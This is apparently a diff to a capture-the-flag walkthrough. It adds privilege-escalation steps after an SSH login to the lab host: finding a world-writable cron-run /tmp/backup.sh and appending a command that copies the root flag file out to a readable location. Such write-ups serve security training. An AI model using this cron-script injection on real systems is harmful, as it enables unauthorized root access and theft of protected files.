@@ -20,3 +20,14 @@ Flags: 2 total
 - 7) SSH into system using credentialls
 	- ssh ctf@34.245.226.103
 - 8) Once in system search for flag, cat file, and enter into HDNA site
+
+- 9) Browse to /etc/crontabs and read files
+- 10) Found /tmp/backup.sh
+- 11) Find permissions and everyone has read and write
+- 12) Contents of script
+```
+#!/bin/sh
+tar -czf /tmp/backup.tar.gz /tmp/*.log
+```
+- 13) Modify backup.sh to get root flag
+	- ``echo "cp /root/flag-root.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt" >> /tmp/backup.sh `
